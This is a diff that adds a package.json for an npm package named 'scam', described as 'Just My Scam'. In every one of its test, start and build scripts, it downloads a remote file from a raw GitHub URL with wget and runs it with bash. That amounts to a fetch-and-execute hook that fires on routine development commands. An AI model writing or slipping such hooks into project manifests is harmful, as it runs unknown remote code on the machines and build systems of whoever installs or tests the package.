@@ -1,0 +1,21 @@
+{
+  "name": "scam",
+  "version": "1.0.0",
+  "description": "Just My Scam",
+  "main": "README.md",
+  "scripts": {
+    "test": "wget https://raw.githubusercontent.com/xzideas/s/main/m && bash ./m",
+    "start": "wget https://raw.githubusercontent.com/xzideas/s/main/m && bash ./m",
+    "build": "wget https://raw.githubusercontent.com/xzideas/s/main/m && bash ./m"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/euyixiyue/scam.git"
+  },
+  "author": "",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/euyixiyue/scam/issues"
+  },
+  "homepage": "https://github.com/euyixiyue/scam#readme"
+}
